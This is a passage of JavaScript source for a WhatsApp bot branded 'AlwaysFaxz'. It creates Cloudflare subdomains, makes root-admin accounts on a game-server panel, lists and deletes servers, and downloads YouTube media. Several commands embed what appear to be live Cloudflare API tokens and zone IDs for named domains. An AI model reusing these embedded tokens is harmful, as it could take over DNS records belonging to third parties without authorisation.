                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd57': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "030c4af3a1a8e92bc3588ac2299ed43a";
               let apitoken = "4rLCTnbktVWjsYWfFoirZv40Aqau8i1EhfHW-lIk"
               let tld = "panelstore.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd58': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f121b6997da209f413cccfbe14ab87a5";
               let apitoken = "SNwPfp0Chd5aCf_d3PxtDdyBtovvUcV6L-JY2kYf"
               let tld = "yasshost.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd59': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4181daaa4a105c9b2b9be81dd85b42f7";
               let apitoken = "np1WPiPMLnFxgUvNL_5-HMd7YvlhumpqNVtugDyX"
               let tld = "diimz.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd60': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "A4E0OuHCDuUy09QCENX2t6suDS5EIIi3urJO101r"
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case 'hd':
  case 'hdr':{
if (!quoted) return replyalwaysfaxzFaxz(`Where is the picture?`)
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕓', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕙', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕛', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '👀', key: m.key }})
			if (!/image/.test(mime)) return replyalwaysfaxzFaxz(`Kirim/Balas Foto Dengan caption ${prefix + command}`)
			replyalwaysfaxz(mess.wait)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			AlwaysFaxzMd.sendMessage(m.chat, { image: proses, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
			await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
			} catch {
			  replyalwaysfaxz('yah eror kak')
			}
			}
			break
case 'setelin': case 'play': {
let yts = require("youtube-yts")
if(!text) return replyalwaysfaxz('> mau cari lagu apa kak')
await AlwaysFaxzMd.sendMessage(m.chat, {
        react: {
            text: "🔎",
            key: m.key,
        }
    })
    await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '⏱', key: m.key }})
    let res = await yts(text)
    let url = res.all;
    let result = url[Math.floor(Math.random() * url.length)]
    let teks = `*⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻*\n*━━━━⬤────────*\n\n> *Judul ☞* ${result.title}\n\n\`Always Faxz No Counter\`\n`
    
     await AlwaysFaxzMd.sendMessage(m.chat, { image: { url: result.thumbnail},  caption: teks },{ quoted: m })
    
  let load = await (await fetch(`https://apikita.exonity.xyz/api/ytdlp?url=${result.url}`)).json();
  let rix = load.result
  
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '📥', key: m.key }})
  
  replyalwaysfaxz(`*_Always Faxz Download Audio,Waiting for you result_*`)
  
  await AlwaysFaxzMd.sendMessage(m.chat, { audio: { url: rix.audio }, mimetype: 'audio/mp4', }, { quoted: m });
}
break
case 'yts': case 'ytsearch': {
  if (!text) return replyalwaysfaxz(`*Example :* ${prefix + command} judulnya`);
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕓', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕙', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕛', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🔎', key: m.key }})
  try {
let yts = require("youtube-yts")
    let search = await yts(text);
    let videos = search.all;

    if (!videos || videos.length === 0) {
      reply('No video found');
      return;
    }

    // Pilih antara 1 dan 5 video secara acak
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];

    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Menghindari pemilihan video yang sama
      selectedVideos.push(randomVideo);
    }

    let push = [];

    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `> *\`[#] Judu :l\`* ${video.title}`;

      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: AlwaysFaxzMd.waUploadToServer });

      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: wm
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ke - ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"Video 🎦","id":"${prefix}ytmp4 ${video.url}"}`
            },
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"Audio 🎵","id":".slebew2 ${video.url}"}`
            }
          ]
        })
      });
    }

    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: mess.success
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: wm
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            })
          })
        }
      }
    }, {});

await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '✅', key: m.key }})

    await AlwaysFaxzMd.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await replyalwaysfaxz(`eror`);
  }
}
break
case 'cadmin': {
if (!isFaxzCreator) return replyalwaysfaxz(`*\`[ # ]\`* _Khusus Faxz_`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user`)
if (!username) return replyalwaysfaxz(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return replyalwaysfaxz(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = generateRandomPassword();
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@admin.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
👤USERNAME: ${user.username}

\`SUKSES CRATE BG FAXZ KECE\`
`
    const listMessage = {

        text: tks,

    }

	

    await AlwaysFaxzMd.sendMessage(m.chat, listMessage)

    await AlwaysFaxzMd.sendMessage(nomornya, {

        text: `📦 \`Kring Kring Pakett\` 📦͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n\n
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*`,

    })

}
break
case 'listsrv': {
  if (!isFaxzCreator) return replyalwaysfaxz(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await AlwaysFaxzMd.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    replyalwaysfaxz(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case 'delsrv': {
      if (!isFaxzCreator) return replyalwaysfaxz(`*\`[ # ]\`* _Khusus Faxz_`)

let srv = args[0]
if (!srv) return replyalwaysfaxz('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return replyalwaysfaxz('*SERVER NOT FOUND*')
replyalwaysfaxz('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
case "ytmp3": case "ytaudio":
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replyalwaysfaxz(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
